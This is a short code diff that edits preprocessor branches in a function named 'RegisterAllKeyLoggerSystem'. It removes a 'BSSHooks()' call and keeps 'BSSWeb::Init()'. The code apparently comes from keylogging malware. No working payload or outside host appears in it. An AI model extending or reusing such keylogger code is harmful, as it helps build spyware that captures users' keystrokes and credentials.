@@ -262,9 +262,7 @@ void RegisterAllKeyLoggerSystem(PKeyLoggerFilterData Data, DWORD hashApp)
 		InistWeb::Init();
 	#endif
 
-	#ifdef BSSH
-    	BSSHooks();
-	#else
+	#ifndef BSSH
 		BSSWeb::Init();
 	#endif
 
